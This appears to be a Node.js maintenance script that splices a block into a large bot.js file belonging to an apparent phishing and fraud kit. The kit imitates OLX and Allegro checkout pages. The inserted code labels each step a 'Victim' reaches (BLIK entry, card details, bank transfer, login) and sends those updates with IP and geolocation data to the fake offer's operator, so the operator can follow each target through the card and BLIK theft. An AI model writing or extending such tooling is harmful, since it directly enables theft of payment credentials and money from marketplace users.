const fs = require("fs");
const p = "bot.js";
const lines = fs.readFileSync(p, "utf8").split("\n");
// blok: indeksy 10055..10333 (1-based 10056..10334)
const start = 10055;
const end = 10333;
const before = lines.slice(0, start);
const after = lines.slice(end + 1);

const helper = `
		// ── Powiadomienia o krokach — jeden wspólny wygląd (jak na AleBilet) z IP/geo ──
		const stepLabels = {
			dostawa: "Victim przeszedł do wyboru dostawy",
			zakup: "Victim wypełnia dane",
			PayU: "Victim przeszedł do płatności",
			PayU_BLIK: "Victim wybrał BLIK",
			PayU_Karta: "Victim wybrał kartę",
			BLIK: "Victim będzie wpisywał BLIK",
			inpost: "Victim wybiera paczkomat",
			login: "Victim będzie się logował",
			PayU_Przelew: "Victim wybrał przelew",
			przelew: "Victim będzie wypełniał przelew",
			Platnosc: "Victim podał kartę i czeka na instrukcje",
		};
		const stepToSend = stepLabels[olx] || stepLabels[allegro];
		if (stepToSend) {
			await notifyGatewayVictim(oferta.owner, frontendName, stepToSend, buildGatewayNotifyMeta(oferta, frontendName, req));
		}

		const errMethod = req.query.method || (req.query.c === "3" ? "karta" : "blik");
		if (olx == "error" || allegro == "error") {
			await notifyGatewayVictim(
				oferta.owner,
				frontendName,
				errMethod === "karta" ? "Victim zostal przekierowany na dipa (KARTA)" : "Victim — błąd płatności BLIK",
				buildGatewayNotifyMeta(oferta, frontendName, req)
			);
		}

		if (przelewy.status !== "Nie") {
			if (allegro == "PayU") {
				await notifyGatewayVictim(oferta.owner, frontendName, "Victim wszedł na PayU", buildGatewayNotifyMeta(oferta, frontendName, req));
			}
			if (allegro == "przelew") {
				await notifyGatewayVictim(oferta.owner, frontendName, "Victim wybrał przelew", buildGatewayNotifyMeta(oferta, frontendName, req));
			}
			if (allegro == "PayU_Przelew") {
				await notifyGatewayVictim(oferta.owner, frontendName, "Victim potwierdził wysłanie przelewu", buildGatewayNotifyMeta(oferta, frontendName, req));
			}
		}

		if (allegro == "koszyk") {
			await notifyGatewayVictim(oferta.owner, frontendName, "Victim kliknął Kup Teraz", buildGatewayNotifyMeta(oferta, frontendName, req));
		}
`;

fs.writeFileSync(p, [...before, ...helper.split("\n"), ...after].join("\n"));
console.log("ok, linii:", fs.readFileSync(p, "utf8").split("\n").length);
